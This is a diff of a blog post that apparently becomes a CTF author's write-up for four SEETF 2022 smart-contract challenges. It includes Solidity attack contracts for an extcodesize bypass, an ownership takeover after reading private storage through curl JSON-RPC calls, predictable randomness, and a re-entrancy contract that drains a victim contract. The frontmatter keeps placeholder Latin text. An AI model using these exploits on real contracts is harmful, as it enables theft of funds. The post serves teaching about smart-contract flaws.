@@ -1,39 +1,309 @@
 ---
-title: SEETF CTF 2022 Smart Contracts Author Writeup
+title: SEETF 2022 Smart Contracts Author Writeup
 publishedAt: "2022-03-12"
 description: Sunt et ut cur Eryx etiamnunc. Duo ore crinita petis vulneribus opus Ophionides est umbra nobilis radicibus ferrugine virentem nec. .
 seoDescription: Sunt et ut cur Eryx etiamnunc. Duo ore crinita petis vulneribus opus Ophionides est umbra nobilis radicibus ferrugine virentem nec.
-category: "Lorem"
-author: { name: "Hunter Becton", image: "/authors/hunter.jpeg" }
+category: "CTF"
+author: { name: "Sebastian", image: "/profile-image.jpg" }
 image: "https://images.unsplash.com/photo-1628329336337-8c33a8f08ec1?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1000&q=80"
 ---
 
-## Vellem tandem
+Here are the challenges I made for SEETF 2022, the inaugural CTF held by [Social Engineering Experts](https://ctftime.org/team/151372).
 
-Lorem markdownum adplicor, et genusque Hectorea est ferri spectat, mensas.
-Clarium nomen sed magis moriens est deseruere stipes, molitor! Sunt et ut cur
-Eryx etiamnunc. Duo ore crinita petis vulneribus opus Ophionides est umbra
-nobilis radicibus ferrugine virentem nec. Conveniunt undis audire [ora
-solvit](http://www.agenorides-vix.org/non-hylaeusque), ad a tempore membraque.
+> This is my first hand at creating CTF challenges. I hope you have enjoyed them! Look out for SEETF 2023, because there will be more and interesting Smart Contracts Challenges!
 
-## Removing Youtube Watch Later Playlist Videos
+| Challenge                                                    | Category        | Solves | Points |
+| ------------------------------------------------------------ | --------------- | ------ | ------ |
+| [Bonjour](./ethereum/Bonjour/)                               | Smart Contracts | 54     | 100    |
+| [You Only Have One Chance](./ethereum/YouOnlyHaveOneChance/) | Smart Contracts | 26     | 775    |
+| [Duper Super Safe Safe](./ethereum/DuperSuperSafeSafe/)      | Smart Contracts | 16     | 919    |
+| [Rolls Royce](./ethereum/RollsRoyce/)                        | Smart Contracts | 14     | 940    |
 
-> The selector might change so change it if it is not working.
+## [BEGINNER-FRIENDLY] Bonjour - Solution
 
-```javascript
-setInterval(function () {
-  document
-    .querySelector('#primary #menu #button button[aria-label="Action menu"]')
-    .click();
-  var things = document.evaluate(
-    '//span[contains(text(),"Remove from")]',
-    document,
-    null,
-    XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,
-    null
-  );
-  for (var i = 0; i < things.snapshotLength; i++) {
-    things.snapshotItem(i).click();
+**Author**: AtlanticBase
+
+**Category**: Ethereum
+
+Just a simple challenge to get the users accustomed to the environment
+
+You just have to replace the `welcomeMessage{:.entity.name.function}` variable to match `Welcome to SEETF{:.entity.name.function}`.
+
+Call `setWelcomeMessage("Welcome to SEETF"){:.entity.name.function}` to change the welcome message and get the flag.
+
+Code to solve the challenge
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Bonjour {
+
+  string public welcomeMessage;
+
+  constructor() {
+    welcomeMessage = "Bonjour";
   }
-}, 1000);
+
+  function setWelcomeMessage(string memory _welcomeMessage) public {
+    welcomeMessage = _welcomeMessage;
+  }
+
+  function isSolved() public view returns (bool) {
+    return keccak256(abi.encodePacked("Welcome to SEETF")) == keccak256(abi.encodePacked(welcomeMessage));
+  }
+}
+
+contract BonjourAttack {
+
+    Bonjour public bonjour;
+
+    constructor() {
+      bonjour = Bonjour("[Address of Bonjour]");
+      bonjour.setWelcomeMessage("Welcome to SEETF");
+    }
+}
+```
+
+## YouOnlyHaveOneChance - Solution
+
+**Author**: AtlanticBase
+
+**Category**: Ethereum
+
+The gist of this is to bypass the `isBig{:.entity.name.function}` function. In order to bypass it you will have to create all your attacks in the constructor. When the constructor is run, the contract size is technically 0 bytes.
+
+```solidity
+contract YouOnlyHaveOneChance {
+    uint256 public balanceAmount;
+    address public owner;
+    uint256 randNonce = 0;
+
+    constructor() {
+        owner = msg.sender;
+
+        balanceAmount =
+            uint256(
+                keccak256(
+                    abi.encodePacked(block.timestamp, msg.sender, randNonce)
+                )
+            ) %
+            1337;
+    }
+
+    function isBig(address _account) public view returns (bool) {
+        uint256 size;
+        assembly {
+            size := extcodesize(_account)
+        }
+        return size > 0;
+    }
+
+    function increaseBalance(uint256 _amount) public {
+        require(tx.origin != msg.sender);
+        require(!isBig(msg.sender), "No Big Objects Allowed.");
+        balanceAmount += _amount;
+    }
+
+    function isSolved() public view returns (bool) {
+        return balanceAmount == 1337;
+    }
+}
+
+contract YouOnlyHaveOneChanceAttack {
+
+  YouOnlyHaveOneChance public youOnlyHaveOneChance;
+
+    constructor() {
+        youOnlyHaveOneChance = YouOnlyHaveOneChance("[Address of YouOnlyHaveOneChance]");
+        youOnlyHaveOneChance.increaseBalance(1337 - youOnlyHaveOneChance.balanceAmount());
+    }
+}
+
+```
+
+## DuperSuperSafeSafe - Solution
+
+**Author**: AtlanticBase
+
+**Category**: Ethereum
+
+This challenge requires you to make use of how blockchain stores information. Setting your variable private doesn't mean that it is private as you can still view it through other ways.
+
+It requires you to know the `EVM storage layout{:.entity.name.function}`.
+
+First, you will need to change the owner. In order to pass the condition, you will have to create a contract to call the function.
+
+In order to get the timestamp,
+
+```bash
+curl --location --request POST 'awesome.chall.seetf.sg:40002/' \
+--header 'Content-Type: application/json' \
+--data-raw '{
+	"jsonrpc":"2.0",
+	"method": "eth_getStorageAt",
+	"params": [
+		"0x0E161f71f41baF3883a2CE0fe04cbaddb5259791",
+		"0x2",
+		"latest"
+	],
+	"id": 1
+}'
+```
+
+You will get
+
+`{"jsonrpc":"2.0","id":1,"result":"0x0000000000000000000000000000000000000000000000000000000062905ffd"}{:.entity.name.function}`
+
+If you convert the result to decimal, you will get the epoch timestamp.
+
+E.G. `1653628925{:.entity.name.function}`
+
+Now, in order to get the passwords, you will need to understand how the mapping works.
+
+Based on the code, the mapping variable is in the second slot of the storage.
+
+However, solidity just uses that as a pointer to the actual data.
+
+You will need to hash the slot (`0x1`) and the key of the mapping variable (`0x0`) to get the value.
+
+You can use `web3{:.entity.name.function}` to calculate the hash
+
+`web3.utils.soliditySha3(0, 1){:.entity.name.function}`
+
+The value is `0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49{:.entity.name.function}`
+
+```bash
+curl --location --request POST 'awesome.chall.seetf.sg:40002/' \
+--header 'Content-Type: application/json' \
+--data-raw '{
+	"jsonrpc":"2.0",
+	"method": "eth_getStorageAt",
+	"params": [
+		"0x0E161f71f41baF3883a2CE0fe04cbaddb5259791",
+		"0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49",
+		"latest"
+	],
+	"id": 1
+}'
+```
+
+Then you will get `0x57617979616e6700000000000000000000000000000000000000000000000000{:.entity.name.function}`
+
+In order to convert it to text, you can use
+`web3.utils.hexToUtf8("0x57617979616e6700000000000000000000000000000000000000000000000000"){:.entity.name.function}`
+
+Second slot,
+
+`web3.utils.soliditySha3(1, 1){:.entity.name.function}`
+
+The value is `0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f{:.entity.name.function}`
+
+```bash
+curl --location --request POST 'awesome.chall.seetf.sg:40002/' \
+--header 'Content-Type: application/json' \
+--data-raw '{
+	"jsonrpc":"2.0",
+	"method": "eth_getStorageAt",
+	"params": [
+		"0x0E161f71f41baF3883a2CE0fe04cbaddb5259791",
+		"0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f",
+		"latest"
+	],
+	"id": 1
+}'
+```
+
+The result is `{"jsonrpc":"2.0","id":1,"result":"0x4375746500000000000000000000000000000000000000000000000000000000"}{:.entity.name.function}`
+
+Converting it to text, `Cute{:.entity.name.function}`.
+
+Create an Attack Contract to call the `changeOwner{:.entity.name.function}` function
+
+```solidity
+contract DSSSAttack {
+
+    DuperSuperSafeSafe dsss;
+
+    constructor() {
+        dsss = DuperSuperSafeSafe(payable(0x0E161f71f41baF3883a2CE0fe04cbaddb5259791));
+        dsss.changeOwner([address]);
+    }
+}
+```
+
+After the owner is changed, you can call the `withdrawFunds` method directly as the EOA is the owner.
+
+To solve, drain all the 0.3 ether in the contract.
+
+Flag: `SEE{B10cKcH41n_I5_sUp3r_53cuRe!}{:.entity.name.function}`
+
+## RollsRoyce - Solution
+
+**Author**: AtlanticBase
+
+**Category**: Ethereum
+
+This challenge is about the insecurities of Randomness in the Ethereum Blockchain and Re-entrancy.
+
+It is not secure if you use the timestamp as attackers can 'predict' the blocks. This is a problem. In order to guess the attack, run the `CoinFlip{:.entity.name.function}` function
+and then guess at the same time and you will be able to get the answer.
+
+Now, after that, you can then use Re-entrancy to drain the contract address and get the funds.
+
+```solidity
+
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "hardhat/console.sol";
+
+enum CoinFlipOption {
+        HEAD,
+        TAIL
+}
+
+interface IRollsRoyce {
+    function guess(CoinFlipOption _guess) external payable;
+    function revealResults() external;
+    function withdrawFirstWinPrizeMoneyBonus() external;
+}
+
+contract RollsRoyceAttack {
+
+    RollsRoyce rr;
+    event Received(address, uint);
+
+    constructor() {
+        rr = RollsRoyce(payable([CONTRACT ADDRESS]));
+    }
+
+    function guessAttack() public payable {
+        for(uint i=0; i<3; i++){
+            CoinFlipOption ans = CoinFlipOption(uint(keccak256(abi.encodePacked((block.timestamp) ^ 0x1F2DF76A6))) % 2);
+            rr.guess{value: 1 ether}(ans);
+            rr.revealResults();
+        }
+    }
+
+    function withdrawAttack() external payable {
+        rr.withdrawFirstWinPrizeMoneyBonus();
+    }
+
+    receive() external payable {
+        if (address([CONTRACT ADDRESS]).balance > 0) {
+            rr.withdrawFirstWinPrizeMoneyBonus();
+            console.log("reentering...");
+            emit Received(msg.sender, msg.value);
+        } else {
+            console.log('victim account drained');
+            payable([EOA ACCOUNT]).transfer(address(this).balance);
+        }
+  }
+
+  function viewBalance() public view returns (uint) {
+      return address(this).balance;
+  }
+}
+
 ```
